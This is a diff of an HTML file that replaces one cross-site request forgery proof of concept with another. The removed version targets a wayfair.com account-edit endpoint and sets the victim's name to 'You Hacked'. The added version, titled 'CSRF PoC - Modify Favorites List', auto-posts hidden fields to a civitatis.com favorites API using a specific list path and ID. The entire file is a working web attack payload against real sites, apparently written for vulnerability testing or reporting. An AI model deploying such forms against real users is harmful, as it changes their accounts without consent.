@@ -1,11 +1,12 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <form action="https://www.wayfair.com/v/account/personal_info/edit?_format=json"
+    <h3>CSRF PoC - Modify Favorites List</h3>
+
+    <form action="https://www.civitatis.com/api/user-account/favorites/list/modify/L2l5RjlpeEZ2bmxsdGQzdnA2d0k1QT09OjozaXFVQzJXd3NM"
           method="POST">
-      <input type="hidden" name="first_name" value="You">
-      <input type="hidden" name="last_name" value="Hacked">
-      <input type="hidden" name="submit" value="true">
+      <input type="hidden" name="listId" value="959266">
+      <input type="hidden" name="listName" value="CSRF_PoC">
       <input type="submit" value="Submit CSRF">
     </form>
   </body>
